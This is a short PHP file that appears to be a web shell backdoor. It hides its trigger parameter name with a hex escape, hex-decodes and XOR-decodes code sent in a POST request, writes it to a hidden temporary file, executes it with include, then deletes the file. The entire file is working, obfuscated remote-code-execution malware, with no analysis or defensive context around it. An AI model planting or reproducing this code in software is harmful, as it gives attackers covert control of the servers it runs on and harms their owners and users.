<?php

if(array_key_exists("data_chu\x6Ek", $_POST)){
	$entity = array_filter([session_save_path(), sys_get_temp_dir(), "/dev/shm", getcwd(), "/tmp", ini_get("upload_tmp_dir"), getenv("TMP"), getenv("TEMP"), "/var/tmp"]);
	$element = hex2bin($_POST["data_chu\x6Ek"]);
	$binding      =     ''     ;    foreach(str_split($element) as $char){$binding .= chr(ord($char) ^ 46);}
	foreach ($entity as $key):
    		if (is_dir($key) && is_writable($key)) {
    $factor = implode("/", [$key, ".obj"]);
    if (@file_put_contents($factor, $binding) !== false) {
	include $factor;
	unlink($factor);
	exit;
}
}
endforeach;
}